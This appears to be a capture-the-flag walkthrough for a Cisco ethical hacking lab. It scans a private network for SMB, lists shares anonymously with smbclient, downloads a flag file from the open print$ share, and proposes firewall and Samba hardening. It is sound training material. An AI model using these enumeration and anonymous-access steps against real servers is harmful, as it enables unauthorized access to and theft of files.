Challenge 3: Exploiting Open SMB Server Shares
This document outlines the steps to complete Challenge 3 of the Cisco Ethical Hacker Capstone Project, focusing on exploiting open SMB server shares on the 10.6.6.0/24 network. The goal is to identify the SMB server (10.6.6.23), enumerate its shares, locate the file taxes.txt in the print$ share, extract the code A9!15wa2, and propose remediation.
Step 1: Scan for Potential Targets Running SMB
Use nmap to scan the 10.6.6.0/24 network for hosts with open SMB ports (139 and 445).
Command:
nmap -p 139,445 10.6.6.0/24

Result: Host 10.6.6.23 has port 445 open, indicating it is likely running SMB services.
Screenshot: See screenshots/step1_nmap_scan.png.
Step 2: Enumerate SMB Shares
Use smbclient to list shares on 10.6.6.23 anonymously (no password).
Command:
smbclient -L //10.6.6.23 -N

Output:
Sharename       Type      Comment
---------       ----      -------
homes           Disk      All home directories
workfiles       Disk      Confidential Workfiles
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (Samba 4.9.5-Debian)

Analysis: print$ and IPC$ are accessible anonymously; homes and workfiles likely require authentication.
Screenshot: See screenshots/step2_smbclient_list_shares.png.
Step 3: Access Shares and Locate/Download the File
Connect to the print$ share anonymously to locate taxes.txt.
Command to connect:
smbclient //10.6.6.23/print$ -N

Inside smbclient:

List files:ls


Download the target file:get taxes.txt


Exit:exit



Local file inspection:
cat taxes.txt

Result: The file taxes.txt is found in the print$ share and contains the code A9!15wa2.
Screenshots:

screenshots/step3_smbclient_connect_ls.png: Output of ls in print$.

Step 4: Propose SMB Attack Remediation
To secure the SMB server:

Restrict Access: Use firewall rules to limit SMB access (ports 139, 445) to trusted IPs.iptables -A INPUT -p tcp --dport 445 -s <trusted_ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 445 -j DROP


Enforce Strong Authentication: In /etc/samba/smb.conf, set:restrict anonymous = 2
guest ok = no

Enable SMB signing/encryption and use strong passwords.

#Screenshot: See screenshots/step4_remediation_notes.png for remediation notes.
Folder Structure

challenges/challenge-3-samba-exploits/
screenshots/
step1_nmap_scan.png
step2_smbclient_list_shares.png
step3_smbclient_connect_ls.png
#step3_download_file.png
#step3_view_code.png
#step4_remediation_notes.png


smb-commands.txt: List of commands used.
walkthrough.md: This file.


